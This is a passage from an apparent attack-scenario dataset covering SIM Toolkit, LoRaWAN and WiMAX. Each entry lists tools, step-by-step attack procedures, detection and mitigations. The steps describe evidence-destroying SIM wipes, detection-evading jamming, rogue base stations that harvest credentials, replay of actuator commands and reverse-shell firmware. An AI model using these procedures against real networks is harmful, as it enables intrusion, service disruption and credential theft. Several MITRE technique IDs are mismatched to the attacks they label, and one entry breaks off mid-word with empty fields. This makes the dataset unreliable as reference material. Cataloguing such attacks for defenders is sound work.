- **Impact**: Covert data wipe, forensic evasion
- **Tools**: Programmable SIM card, OTA SMS trigger platform
- **Scenario**: SIM applet executes data wipe on command, useful for insider data destruction.
- **Attack Steps**: Step 1: An insider embeds a custom applet into a corporate-issued SIM card, programmed to monitor for a specific trigger message.Step 2: Once the message "RESET-ALL" is sent via SMS from a predefined number, the applet activates.Step 3: The applet uses STK commands to trigger mobile phone’s data reset commands or to corrupt stored contact/SMS data.Step 4: This renders forensic analysis difficult as data is lost without any physical access.Step 5: It can be used by insiders to destroy evidence of fraud or compromise.
- **Detection**: Pattern SMS detection, SIM audit
- **Solution**: Use STK watchdogs, restrict custom applets, encrypted backups
- **Tags**: Insider Threat, Data Wipe, STK Destruction

## Forced Network Downgrade via STK Script

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Any SIM-enabled mobile phone
- **Vulnerability**: STK-induced network preference override
- **MITRE**: T1430 (Network Downgrade for MITM)
- **Impact**: Enables future interception and spying
- **Tools**: SIMTrace2, OTA push tool, phone with downgrade logging
- **Scenario**: Malicious SIM script changes network mode from 4G to 2G, making user vulnerable to MITM attacks.
- **Attack Steps**: Step 1: Attacker modifies a SIM applet to include SETUP MENU + SEND TERMINAL RESPONSE commands to alter preferred network settings.Step 2: Applet is injected via OTA or via custom SIM issued to targets.Step 3: On execution, the STK script causes the mobile device to drop to 2G (GSM-only).Step 4: Victim’s device no longer uses encryption properly, enabling MITM attacks via rogue base stations.Step 5: The downgrade happens silently with no warning to the user.
- **Detection**: Network change monitoring tools
- **Solution**: Lock SIMs to 4G/5G only or restrict STK access to modem controls
- **Tags**: 2G Downgrade, MITM Setup, STK Abuse

## Social Engineering via SIM Toolkit-Based Survey

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Mobile users
- **Vulnerability**: SIM UI used to fake customer interactions
- **MITRE**: T1204.002 (Social Engineering via Fake Interface)
- **Impact**: Identity theft, data collection
- **Tools**: OTA SMS composer, attacker-controlled SMS number
- **Scenario**: Attacker sends STK-based fake "customer survey" and collects sensitive user data.
- **Attack Steps**: Step 1: Attacker sends OTA SMS to inject an STK applet titled "Customer Satisfaction Survey".Step 2: Victim is prompted with multiple-choice questions that appear innocent but are designed to extract sensitive personal info (e.g., favorite bank, birthdate, mother’s maiden name).Step 3: Victim completes the survey thinking it's official from the telecom provider.Step 4: STK applet compiles answers and sends them back to attacker via silent SMS.Step 5: Attacker uses answers for identity theft or future phishing.
- **Detection**: STK UI behavior logging
- **Solution**: Validate SIM applets, limit OTA install access
- **Tags**: SIM Toolkit, Survey Scam, Info Harvesting

## LoRaWAN Downlink Frame Sniffing

- **Attack Type**: LoRa/LPWAN Sniffing
- **Target**: LoRaWAN Gateway
- **Vulnerability**: Unencrypted downlink frames
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Leakage of control commands, IoT hijack
- **Tools**: SDR (e.g., HackRF), LoRaSniff, GNURadio
- **Scenario**: Attacker captures unencrypted downlink traffic from LoRaWAN gateways to extract device commands
- **Attack Steps**: Step 1: Setup HackRF with LoRaSniff to operate on 868MHzStep 2: Tune to LoRaWAN downlink channel used by target gatewayStep 3: Begin sniffing and save all received packetsStep 4: Use Wireshark with LoRaWAN dissector to view payloadsStep 5: Identify unencrypted downlink messages and extract control data (e.g., actuator commands)
- **Detection**: Monitor RF spectrum for rogue sniffers, anomaly detection on command replay
- **Solution**: Enforce payload encryption at all layers
- **Tags**: LoRaWAN, SDR, Downlink Sniffing

## DevAddr Spoofing via LoRa Injection

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN Network Server
- **Vulnerability**: DevAddr reuse without MIC verification
- **MITRE**: T1557 (Adversary-in-the-Middle)
- **Impact**: Backend pollution with false data
- **Tools**: Arduino with LoRa Shield, RFM95, LoRaLib
- **Scenario**: Attacker spoofs a known DevAddr and injects fake uplink packets to simulate fake sensor data
- **Attack Steps**: Step 1: Identify DevAddr used by sniffing real uplinksStep 2: Use Arduino + LoRa to craft packet with same DevAddrStep 3: Modify payload to include fake temperature valuesStep 4: Send crafted packet on correct frequency and SFStep 5: Observe backend interpreting fake packet as valid
- **Detection**: Backend logs, unexpected payload validation
- **Solution**: Use MIC verification and backend payload sanity checks
- **Tags**: LoRa Injection, Fake Uplink, IoT

## Join Accept Replay Attack

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN End Node
- **Vulnerability**: Weak nonce handling in Join Accept
- **MITRE**: T1557 (Session Hijacking)
- **Impact**: Unauthorized node access to network
- **Tools**: HackRF, GNURadio, LoRaWAN Toolkit
- **Scenario**: Replay old Join Accept messages to allow a malicious device to rejoin network
- **Attack Steps**: Step 1: Sniff and record a real Join Accept messageStep 2: Use LoRa injection tools to replay that Join AcceptStep 3: Configure malicious node with the same DevEUIStep 4: Observe network accepting join (if nonces not enforced)Step 5: Malicious node now sends uplinks as legitimate
- **Detection**: Monitor for duplicate DevEUIs and Join Accept reuse
- **Solution**: Enforce frame counter and nonce tracking
- **Tags**: Join Replay, DevEUI Spoof

## LoRaWAN MAC Command Injection

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN End Node
- **Vulnerability**: Lack of MIC check on MAC commands
- **MITRE**: T1499 (Endpoint Denial of Service)
- **Impact**: Downgraded transmission, denial of service
- **Tools**: SDR (HackRF), GNURadio, Custom Python script
- **Scenario**: Malicious actor injects MAC control commands (e.g., LinkADRReq) to manipulate device behavior
- **Attack Steps**: Step 1: Sniff MAC command structure using LoRaSniffStep 2: Modify MAC payload to include LinkADRReq with low data rateStep 3: Inject modified packet toward end nodeStep 4: Target device accepts new settings and downgrades performanceStep 5: Confirm data rate degradation by observing uplinks
- **Detection**: Uplink anomalies, MAC command monitoring
- **Solution**: Harden MAC verification with proper MIC
- **Tags**: MAC Injection, DoS, LoRa

## LPWAN Frequency Hopping Disruption

- **Attack Type**: LoRa/LPWAN Sniffing + Injection
- **Target**: LoRaWAN Gateway
- **Vulnerability**: Predictable channel hopping patterns
- **MITRE**: T1467 (Signal Interference)
- **Impact**: Uplink/downlink disruption
- **Tools**: HackRF, GNURadio, Spectrum Analyzer
- **Scenario**: Disrupting LoRaWAN by predicting hopping sequence and jamming key channels
- **Attack Steps**: Step 1: Observe gateway channel plan and hopping logicStep 2: Record packet timestamps and frequency transitionsStep 3: Predict future frequency use based on duty cycleStep 4: Emit continuous noise/jamming signal on those channelsStep 5: Confirm packet loss or retransmissions on uplinks
- **Detection**: Sudden rise in retransmission or missed packets
- **Solution**: Adaptive FHSS, randomized hopping
- **Tags**: Jamming, Frequency Prediction

## LoRa Payload Decoder Attack

- **Attack Type**: LoRa/LPWAN Sniffing
- **Target**: LoRaWAN End Device
- **Vulnerability**: Lack of payload encryption
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Privacy breach, surveillance
- **Tools**: HackRF, LoRaSniff, Wireshark
- **Scenario**: Attacker captures and decodes unencrypted LoRa sensor data to reveal sensitive information like GPS, temperature, etc.
- **Attack Steps**: Step 1: Power on HackRF and connect it to the LoRaSniff tool on a laptopStep 2: Identify the target frequency (e.g., 868 MHz in EU) using spectrum analyzerStep 3: Begin passive sniffing of the LoRa airwavesStep 4: Capture packets and export to PCAP formatStep 5: Open PCAP in Wireshark with LoRaWAN dissectorStep 6: Decode payload to extract GPS coordinates and sensor valuesStep 7: Correlate data over time to understand device patterns
- **Detection**: Payload inspection on backend logs
- **Solution**: Use end-to-end encryption (E2EE) on payloads
- **Tags**: Payload, Sensor Data, Privacy

## LoRaWAN MIC Bypass with Custom Frame

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN Gateway
- **Vulnerability**: Weak MIC verification logic
- **MITRE**: T1003.005 (Credentials from Password Stores)
- **Impact**: Fake data accepted into system
- **Tools**: RFM95 LoRa module, Arduino, Custom Python Scripts
- **Scenario**: Attacker crafts packets with guessed MIC (Message Integrity Code) to bypass message authentication and confuse gateways
- **Attack Steps**: Step 1: Capture real LoRa packets to study MIC formatStep 2: Develop script to brute-force or guess MIC combinationsStep 3: Use Arduino + LoRa module to inject custom payloadsStep 4: Monitor gateway logs to see if any packets get acceptedStep 5: If accepted, observer sees fake data polluting the backendStep 6: Repeat to create persistent false data stream
- **Detection**: Analyze logs for non-verified MICs
- **Solution**: Use secure AES128 MIC validation
- **Tags**: MIC, Bypass, Fake Packets

## Remote Sensor Command Replay

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN Actuator Node
- **Vulnerability**: Replay of authorized commands
- **MITRE**: T1210 (Exploitation of Remote Services)
- **Impact**: Unauthorized physical action
- **Tools**: HackRF, GNURadio, LoRa Repeater Tool
- **Scenario**: Replay previously sniffed actuator commands to toggle devices remotely, like opening valves or turning motors on/off
- **Attack Steps**: Step 1: Capture actuator command packet sent from gateway to deviceStep 2: Save the frame, including DevAddr and payloadStep 3: Re-broadcast the packet using HackRF on the correct channelStep 4: Wait for actuator device to accept and execute commandStep 5: Observe physical change (e.g., valve opens) without permissionStep 6: Repeat to simulate persistent control abuse
- **Detection**: Alerts from redundant sensors, actuator feedback
- **Solution**: Include nonces and timestamps to prevent replay
- **Tags**: Replay, LoRaWAN Actuator

## Passive Gateway Mapping via Packet Timing

- **Attack Type**: LoRa/LPWAN Sniffing
- **Target**: LoRaWAN Gateways
- **Vulnerability**: Lack of gateway obfuscation
- **MITRE**: T1590.005 (Physical Location Disclosure)
- **Impact**: Gateway fingerprinting, tracking
- **Tools**: LoRaSniff, GNURadio, GPS Logger
- **Scenario**: Attacker maps gateway locations and coverage by analyzing the time/frequency of packet relays
- **Attack Steps**: Step 1: Use a GPS-enabled laptop and walk/drive around a city with LoRaSniffStep 2: Capture time, frequency, and metadata of packets receivedStep 3: Note signal strength (RSSI) and spreading factorStep 4: Analyze in mapping software to triangulate gateway proximityStep 5: Generate heatmap of likely gateway coverage zonesStep 6: Use result to plan future injection or jamming attacks
- **Detection**: Unexpected mapping behavior in RF logs
- **Solution**: Randomize transmit power and use multiple gateways
- **Tags**: Mapping, Recon, Coverage Profiling

## LoRa End Device Cloning

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN End Node
- **Vulnerability**: Reuse of DevAddr and predictable keys
- **MITRE**: T1208 (Hardware Additions)
- **Impact**: Data integrity compromise
- **Tools**: LoRaWAN DevKit, Arduino, STM32 LoRa Board
- **Scenario**: Clone a device using its DevAddr and keys to send spoofed packets that are accepted by the server
- **Attack Steps**: Step 1: Sniff packets to identify DevAddr and frame countersStep 2: Guess or retrieve AppSKey/NwkSKey if weakly protected or reusedStep 3: Program cloned device with same keys and DevAddrStep 4: Generate and transmit fake data with realistic payloadsStep 5: Monitor backend logs to confirm acceptance of spoofed packets
- **Detection**: Anomaly detection on device ID and frame counters
- **Solution**: Enforce unique DevAddr and strong key rotation
- **Tags**: Cloning, Spoof, LoRaWAN

## Gateway Command Overload via LoRa Flood

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN Gateway
- **Vulnerability**: Unauthenticated uplink flooding
- **MITRE**: T1499.001 (Endpoint DoS – Application)
- **Impact**: Gateway DoS, loss of service
- **Tools**: Multiple LoRa Nodes, SDRs, Custom Payload Generator
- **Scenario**: Overwhelm gateway with constant packet injection using randomized DevAddrs to simulate a DoS attack
- **Attack Steps**: Step 1: Use a script to generate random DevAddrs and payloadsStep 2: Configure 3+ LoRa nodes or SDRs to inject at high intervalStep 3: Monitor gateway CPU and log performance degradationStep 4: Observe packet drop rate and processing delaysStep 5: Correlate with system logs showing increased load
- **Detection**: Gateway health monitoring
- **Solution**: Rate-limit uplinks, apply uplink filters
- **Tags**: DoS, Flood, LoRaWAN

## Channel-Based Selective Jamming

- **Attack Type**: LoRa/LPWAN Injection + Sniffing
- **Target**: LoRaWAN Network
- **Vulnerability**: Predictable channel reuse
- **MITRE**: T1467 (Signal Interference)
- **Impact**: Targeted communication breakdown
- **Tools**: SDR (HackRF or LimeSDR), Spectrum Analyzer
- **Scenario**: Attacker identifies critical channels used by LoRaWAN and selectively jams those only
- **Attack Steps**: Step 1: Sniff packets to identify which channels have the most activityStep 2: Create a list of high-frequency channels in useStep 3: Configure SDR to emit noise only on those channels during transmission windowsStep 4: Observe drop in successful communication from certain devicesStep 5: Maintain jamming intermittently to evade detection
- **Detection**: Frequency anomaly detection
- **Solution**: Adaptive channel hopping, frequency diversity
- **Tags**: Jamming, Smart Interference

## LoRa Packet Injection with False Sensor Triggers

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN Alerting System
- **Vulnerability**: Weak data validation
- **MITRE**: T1553.002 (Subvert Trust Controls – Code Signing)
- **Impact**: Panic, unnecessary alerts, resource misuse
- **Tools**: Arduino LoRa, LoRaLib
- **Scenario**: Inject fake alerts (e.g., fire, gas leak) using spoofed packets to trigger emergency responses
- **Attack Steps**: Step 1: Analyze real sensor payload formatStep 2: Use same DevAddr and format to craft a false alert (e.g., high CO2 value)Step 3: Transmit the packet at the correct SF and frequencyStep 4: Observe backend dashboard showing false alertStep 5: Record response or alert propagation behavior
- **Detection**: Validate thresholds with physical verification
- **Solution**: Use multi-sensor corroboration before action
- **Tags**: False Alerts, Emergency Trigger

## Duty Cycle Exploit to Cause Message Loss

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN End Nodes
- **Vulnerability**: Duty cycle starvation
- **MITRE**: T1499 (Resource Exhaustion)
- **Impact**: Message loss, sensor delay
- **Tools**: LoRa Transmitter Node, Packet Flooder Tool
- **Scenario**: Continuously inject packets to force duty cycle limit breach, making legitimate messages ignored
- **Attack Steps**: Step 1: Identify duty cycle limits (e.g., 1% per hour in EU)Step 2: Inject continuous packets near the legal limitStep 3: Legitimate nodes wait until channel is free but get rejectedStep 4: Monitor network for unusual delay or dropped messagesStep 5: Track packet backlog on gateway
- **Detection**: Packet count alerts and duty cycle monitoring
- **Solution**: Limit airtime per node, blacklist offenders
- **Tags**: Duty Cycle, Resource Abuse

## Cross-Network Packet Injection

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN Gateways
- **Vulnerability**: NetID overlap with weak filtering
- **MITRE**: T1557.002 (Cross Protocol Exploitation)
- **Impact**: Inter-network injection and data pollution
- **Tools**: LoRa Radio Module, LoRaWAN Mapper Tools
- **Scenario**: Inject packets using a DevAddr from another network (same NetID) to bypass loose filtering
- **Attack Steps**: Step 1: Identify a NetID range shared across networksStep 2: Use known DevAddr format to create a valid-looking packetStep 3: Inject into overlapping frequency used by nearby LoRaWANStep 4: Monitor if the nearby network server mistakenly processes itStep 5: Confirm data acceptance from cross-network packet
- **Detection**: Audit device NetIDs and filter strictly
- **Solution**: Assign distinct NetIDs, whitelist devices
- **Tags**: CrossNet, Overlap Injection

## LoRaWAN Adaptive Data Rate (ADR) Abuse

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN End Node
- **Vulnerability**: Trust in link quality reports
- **MITRE**: T1557.002 (Protocol Manipulation)
- **Impact**: Denial of service, miscommunication
- **Tools**: SDR (HackRF), GNURadio, Custom LoRa Packet Injector
- **Scenario**: Attacker manipulates the ADR algorithm by injecting falsified link quality reports, causing device misconfiguration
- **Attack Steps**: Step 1: Sniff several packets from a target end device to identify its DevAddr, spreading factor (SF), and frequencyStep 2: Record the gateway’s MAC commands adjusting the data rate (ADR) based on link qualityStep 3: Inject fake packets on behalf of the end device, pretending to have excellent signal strength (high RSSI)Step 4: Gateway adjusts data rate down, assuming better connectivityStep 5: Real device struggles to transmit effectively due to inappropriate SF setting, causing message lossStep 6: Monitor system logs to verify device outage or dropped uplinks
- **Detection**: Analyze RSSI fluctuations and ADR logs
- **Solution**: Cross-verify ADR changes with physical signal data
- **Tags**: ADR, LoRaWAN Abuse

## LoRaWAN Frame Counter Desync Attack

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN End Device
- **Vulnerability**: Lack of robust FCnt tracking or resync
- **MITRE**: T1557.001 (Spoofing)
- **Impact**: Loss of legitimate data from device
- **Tools**: LoRaWAN DevKit, Python LoRa Inject Script
- **Scenario**: Injecting packets with high frame counters causes desynchronization of legitimate device communication
- **Attack Steps**: Step 1: Sniff a few uplink packets from a valid LoRa device and note the current frame counter (FCnt)Step 2: Craft and inject multiple fake packets with the same DevAddr but with a much higher FCntStep 3: Network server stores the latest FCnt to validate next incoming packetsStep 4: Real device tries to send next legitimate message with lower FCntStep 5: Server discards legitimate packets due to frame counter mismatchStep 6: Device is considered desynced and requires manual reset or rejoin
- **Detection**: Detection via FCnt anomaly logs
- **Solution**: Implement rejoin mechanisms and limit FCnt jumps
- **Tags**: Frame Counter, Desync, LoRa

## LoRa Rejoin Flooding Attack

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN Gateway and End Devices
- **Vulnerability**: Join accept blocking, fake join floods
- **MITRE**: T1499.003 (Service Exhaustion)
- **Impact**: Gateway denial of service and device lockout
- **Tools**: HackRF, GNURadio, Packet Blocker Tool
- **Scenario**: Overload the network by forcing devices to rejoin continuously through fake commands or blocking Join Accepts
- **Attack Steps**: Step 1: Sniff a Join Request from a deviceStep 2: Jam or block the Join Accept response from the gateway using timed RF interferenceStep 3: Device retries join after timeoutStep 4: Repeat blocking, causing a loop where the device never fully rejoinsStep 5: Alternatively, flood the network with your own Join Requests using fake DevEUIsStep 6: Monitor gateway CPU load and device unavailability logs
- **Detection**: Excessive join logs or gateway performance dip
- **Solution**: Enforce join limits and implement anti-replay
- **Tags**: Join Flood, Rejoin Abuse

## LoRaWAN Packet Injection with Obfuscated Payloads

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: LoRaWAN Network Server
- **Vulnerability**: Lack of payload validation and obfuscation detection
- **MITRE**: T1001.002 (Obfuscated Files or Information)
- **Impact**: Security monitoring bypass, false logging
- **Tools**: Arduino LoRa Module, LoRaLib with XOR Payload Generator
- **Scenario**: Attacker injects obfuscated payloads that appear legitimate, making it hard for security filters to detect anomalies
- **Attack Steps**: Step 1: Reverse-engineer payload format of target sensor (e.g., temperature or GPS format)Step 2: Apply lightweight obfuscation like XOR, Base64, or dummy bytesStep 3: Send payload using valid DevAddr and correct frame counterStep 4: Backend receives obfuscated data and stores it without verificationStep 5: Analyst sees unreadable or malformed values, confusing incident detection systemsStep 6: Use logs to identify which filters failed to detect the injection
- **Detection**: Analyze malformed payload frequency
- **Solution**: Enforce strict payload structure validation
- **Tags**: Obfuscation, Payload Attack

## Remote Command Injection via Confused Gateway

- **Attack Type**: LoRa/LPWAN Injection
- **Target**: 
- **Vulnerability**: 
- **MITRE**: 
- **Impact**: 
- **Tools**: Two LoRa Nodes (Attacker + Victim), SDR, Misconfigured Gateway
- **Scenario**: Exploit a misconfigured gateway to relay fake control commands to end devices without origin verification
- **Attack Steps**: Step 1: Setup a second rogue gateway that overlaps frequency with a legitimate oneStep 2: Broadcast a legitimate-looking downlink packet from rogue gateway with control instructions (e.g., reset device, change mode)Step 3: Target end device picks up and executes the commandStep 4: Device is misconfigured or made to rejoin, stop reporting, or erase logsSt
- **Detection**: 
- **Solution**: 
- **Tags**: 

## Rogue Base Station Attack on WiMAX

- **Attack Type**: WiMAX Rogue Station
- **Target**: WiMAX Clients
- **Vulnerability**: Lack of base station authentication
- **MITRE**: T1583.007
- **Impact**: Man-in-the-middle, Data Interception
- **Tools**: OpenBTS, GNU Radio, USRP
- **Scenario**: Attacker sets up a fake WiMAX base station to impersonate a legitimate provider, tricking clients into connecting.
- **Attack Steps**: Step 1: Obtain a USRP (Universal Software Radio Peripheral) and install GNU Radio and OpenBTS on your system. Step 2: Configure the software to simulate a WiMAX base station using a similar frequency and ID as a real one.Step 3: Broadcast fake beacon messages over the WiMAX frequency range (typically 2.5GHz or 3.5GHz).Step 4: Wait for nearby WiMAX clients to detect and connect to your rogue station.Step 5: Once connected, intercept or log data, issue disconnects, or perform redirection attacks.
- **Detection**: Monitor for unusual base station IDs or repeated disconnects
- **Solution**: Use base station certificate validation and mutual authentication
- **Tags**: WiMAX, Rogue AP, SDR, MITM

## WiMAX Authentication Bypass via Replay Attack

- **Attack Type**: Replay Attack
- **Target**: WiMAX Base Station
- **Vulnerability**: Weak cryptographic protections in management frames
- **MITRE**: T1557
- **Impact**: Unauthorized access, session hijack
- **Tools**: Wireshark, GNU Radio, USRP
- **Scenario**: An attacker captures a valid authentication message between client and base station and replays it to gain unauthorized access.
- **Attack Steps**: Step 1: Use GNU Radio with USRP to passively listen to WiMAX traffic during client authentication.Step 2: Use Wireshark or a custom parser to identify and extract authentication handshake messages.Step 3: Reconstruct the captured handshake message packets.Step 4: Replay the authentication packet at a later time to the base station to attempt a re-authentication without credentials.Step 5: If successful, gain temporary access or disrupt session integrity.
- **Detection**: Compare timestamps and session counters
- **Solution**: Implement time-based nonce and replay protection mechanisms
- **Tags**: Replay, WiMAX, Authentication, SDR

## WiMAX Bandwidth Exhaustion via Flooding

- **Attack Type**: Denial-of-Service
- **Target**: WiMAX Base Station
- **Vulnerability**: No rate-limiting on connection attempts
- **MITRE**: T1499.001
- **Impact**: Service unavailability for clients
- **Tools**: Scapy, USRP, GNU Radio
- **Scenario**: Attacker floods the base station with fake connection requests, exhausting its bandwidth and preventing legitimate access.
- **Attack Steps**: Step 1: Set up your SDR environment using GNU Radio and USRP.Step 2: Use Scapy or custom scripts to generate continuous connection initiation requests (e.g., RNG-REQ messages) to the WiMAX base station.Step 3: Configure your system to rapidly change MAC addresses to simulate many different clients.Step 4: Launch the flood and monitor base station response and latency.Step 5: Measure degradation of service to other connected clients.
- **Detection**: Analyze network load and authentication request volume
- **Solution**: Enforce rate limits and client verification
- **Tags**: DoS, Flooding, WiMAX, SDR

## WiMAX Configuration Information Leakage

- **Attack Type**: Info Disclosure
- **Target**: WiMAX Network
- **Vulnerability**: Broadcast management frames unencrypted
- **MITRE**: T1592.004
- **Impact**: Network reconnaissance & mapping
- **Tools**: USRP, GNU Radio, Wireshark
- **Scenario**: The attacker passively captures broadcast management frames to extract network configuration details like IP addresses, MACs, etc.
- **Attack Steps**: Step 1: Configure USRP to sniff WiMAX frequencies (e.g., 2.3GHz - 3.5GHz).Step 2: Use GNU Radio flowgraphs to demodulate WiMAX OFDMA signals.Step 3: Capture broadcast and management frames being transmitted between base station and client.Step 4: Use Wireshark or custom decoder to parse these messages for IP addresses, network IDs, QoS profiles, etc.Step 5: Use the information to map the network or launch follow-up attacks like spoofing or fuzzing.
- **Detection**: RF monitoring of WiMAX band
- **Solution**: Encrypt all management/broadcast frames
- **Tags**: Reconnaissance, InfoLeak, WiMAX

## WiMAX CPE Firmware Downgrade Exploit

- **Attack Type**: Downgrade Attack
- **Target**: WiMAX Modem/CPE
- **Vulnerability**: No firmware integrity validation
- **MITRE**: T1600
- **Impact**: Device takeover or persistence
- **Tools**: Custom Exploit Script, TFTP Server, USRP
- **Scenario**: Attacker forces a WiMAX CPE device (modem/router) to downgrade to an older firmware with known vulnerabilities.
- **Attack Steps**: Step 1: Identify the CPE (Customer Premise Equipment) brand and model used in the environment.Step 2: Research or reverse engineer the firmware update protocol used by the CPE (typically over TFTP).Step 3: Set up a fake base station using USRP that impersonates a real one and includes a fake firmware update URL.Step 4: Trigger the CPE to request a firmware update and provide it with a known-vulnerable old version.Step 5: After successful downgrade, exploit the older firmware's known bugs (e.g., unauthenticated admin panel access).
- **Detection**: Monitor firmware versions and update traffic
- **Solution**: Enforce signed firmware with integrity checks
- **Tags**: Firmware, Downgrade, WiMAX

## WiMAX Ranging Process Exploitation

- **Attack Type**: Protocol Abuse
- **Target**: WiMAX Base Station
- **Vulnerability**: Lack of validation in initial ranging
- **MITRE**: T1499
- **Impact**: Desynchronization, client lockout
- **Tools**: GNU Radio, USRP, Custom Scripts
- **Scenario**: Attacker manipulates the ranging process in WiMAX to confuse the base station, leading to desynchronization or denial of access.
- **Attack Steps**: Step 1: Understand the WiMAX ranging process (used by clients to synchronize and get bandwidth).Step 2: Configure USRP to transmit fake ranging requests (RNG-REQ) repeatedly at slightly different times and power levels.Step 3: Send manipulated ranging responses that cause timing offset issues.Step 4: Observe how base station allocates bandwidth inefficiently or rejects legitimate clients due to timing errors.Step 5: Measure denial of service impact on real users.
- **Detection**: Monitor excessive ranging retries
- **Solution**: Use strict timing and power-level validation
- **Tags**: Ranging, Sync Attack, DoS

## WiMAX EAP Spoofing to Harvest Credentials

- **Attack Type**: Credential Harvesting
- **Target**: WiMAX Clients
- **Vulnerability**: No mutual authentication
- **MITRE**: T1586.002
- **Impact**: Credential theft, network breach
- **Tools**: FreeRADIUS, GNU Radio, USRP
- **Scenario**: Attacker fakes the base station and captures EAP (Extensible Authentication Protocol) credentials from clients.
- **Attack Steps**: Step 1: Set up USRP to mimic a real WiMAX base station.Step 2: Configure FreeRADIUS server to accept EAP authentication requests.Step 3: Broadcast beacon signals matching a known WiMAX network.Step 4: Wait for clients to attempt EAP-based authentication.Step 5: Log usernames and hashed passwords sent during the authentication process for offline cracking.
- **Detection**: Monitor for fake base station activity
- **Solution**: Enforce client-side server validation
- **Tags**: EAP, Credential Capture, WiMAX

## Session Key Hijacking via Management Message Injection

- **Attack Type**: Key Hijacking
- **Target**: WiMAX Client
- **Vulnerability**: No integrity on management key messages
- **MITRE**: T1600
- **Impact**: Traffic decryption, session manipulation
- **Tools**: Wireshark, GNU Radio, USRP
- **Scenario**: Attacker injects forged management messages to replace the session key during key exchange.
- **Attack Steps**: Step 1: Monitor WiMAX management frames during client connection using SDR and Wireshark.Step 2: Wait for session key exchange messages (TEK - Traffic Encryption Key).Step 3: Send forged TEK message with attacker's chosen key to the client.Step 4: If successful, the client uses this new key, allowing attacker to decrypt future data.Step 5: Log and analyze traffic decrypted using the hijacked key.
- **Detection**: Detect duplicate key exchange messages
- **Solution**: Sign management key messages with integrity
- **Tags**: Key Injection, MITM, WiMAX

## WiMAX Frequency Jamming Attack

- **Attack Type**: RF Jamming
- **Target**: WiMAX Network
- **Vulnerability**: No RF interference defense
- **MITRE**: T1565.002
- **Impact**: Communication blackout, denial of service
- **Tools**: HackRF, SDR-Jammer Tool
- **Scenario**: Attacker transmits high-power noise in WiMAX frequency bands to disrupt communication.
- **Attack Steps**: Step 1: Identify the specific frequency band in use by the WiMAX network (e.g., 2.5GHz).Step 2: Use SDR-Jammer tool with HackRF to transmit high-power signals continuously in that band.Step 3: Vary the modulation pattern or switch to burst mode to evade simple detection.Step 4: Observe the impact on base station and client connection stability.Step 5: Log and visualize throughput drops or loss of service.
- **Detection**: RF spectrum analysis for jamming signals
- **Solution**: Use frequency hopping or spread spectrum
- **Tags**: Jamming, RF, Denial-of-Service

## WiMAX Base Station Spoofing with Malicious Firmware Updates

- **Attack Type**: Firmware Exploitation
- **Target**: WiMAX CPE
- **Vulnerability**: Firmware update source not verified
- **MITRE**: T1203
- **Impact**: Remote code execution, persistence
- **Tools**: TFTP Server, USRP, Malicious Firmware Builder
- **Scenario**: Attacker spoofs base station and delivers malicious firmware updates to client modems.
- **Attack Steps**: Step 1: Reverse engineer the firmware update mechanism used by CPE (usually TFTP-based).Step 2: Create a custom malicious firmware image (e.g., with a reverse shell embedded).Step 3: Set up rogue base station using USRP to broadcast update instructions.Step 4: Client CPE requests firmware, which attacker delivers via fake TFTP.Step 5: After installation, attacker gains remote access to the device.
- **Detection**: Monitor unauthorized firmware versions
- **Solution**: Use digitally signed firmware
- **Tags**: Firmware Exploit, Rogue BS, WiMAX

## MAC Spoofing to Evade Access Control in WiMAX

- **Attack Type**: Identity Spoofing
- **Target**: WiMAX Base Station
- **Vulnerability**: Weak identity validation
- **MITRE**: T1036.005
- **Impact**: Unauthorized access, billing bypass
- **Tools**: macchanger, GNU Radio
- **Scenario**: Attacker changes MAC address to mimic authorized device and gain network access.
- **Attack Steps**: Step 1: Capture legitimate client MAC address during session using GNU Radio SDR sniffing.Step 2: Use macchanger or manual settings to spoof that MAC on the attacker’s interface.Step 3: Re-attempt connection to WiMAX base station using the spoofed identity.Step 4: If MAC-based filtering is used, attacker gains unauthorized access.Step 5: Monitor for successful IP assignment and data flow.
- **Detection**: Monitor for duplicate MACs or IP conflicts
- **Solution**: Use mutual authentication & MAC whitelisting
- **Tags**: MAC Spoofing, WiMAX, Bypass

## WiMAX Uplink Bursting Exploit

- **Attack Type**: Bandwidth Abuse
- **Target**: WiMAX Base Station
- **Vulnerability**: Trusts burst size claims from clients
- **MITRE**: T1499
- **Impact**: Network congestion, unfair resource usage
- **Tools**: GNU Radio, Custom Modulator
- **Scenario**: Attacker sends oversized uplink data bursts by faking bandwidth grants.
- **Attack Steps**: Step 1: Intercept bandwidth grant allocations from base station using SDR.Step 2: Forge uplink bursts that exceed allocated data slots.Step 3: Use GNU Radio custom modulator to insert high-volume data in uplink bursts.Step 4: Measure how base station reacts to the burst overload.Step 5: Confirm if attacker can hog uplink channel, causing quality degradation for others.
- **Detection**: Monitor burst timing and size consistency
- **Solution**: Enforce strict uplink size checks
- **Tags**: Bandwidth Abuse, Bursting, WiMAX

## Downlink Stream Sniffing on Unencrypted WiMAX

- **Attack Type**: Eavesdropping
- **Target**: WiMAX Clients
- **Vulnerability**: No encryption on downlink data
- **MITRE**: T1040
- **Impact**: Privacy breach, data harvesting
- **Tools**: GNU Radio, Wireshark
- **Scenario**: Attacker passively captures unencrypted data from base station to clients.
- **Attack Steps**: Step 1: Use SDR to tune into the WiMAX downlink channel.Step 2: Configure GNU Radio to decode OFDMA symbols and extract data frames.Step 3: Use Wireshark with custom dissectors to analyze downlink traffic.Step 4: Reconstruct payloads like HTTP or DNS requests to understand user activity.Step 5: Log and document all unencrypted sessions for study.
- **Detection**: Monitor for passive sniffing RF tools
- **Solution**: Enforce mandatory data encryption
- **Tags**: Sniffing, WiMAX, Passive, Privacy

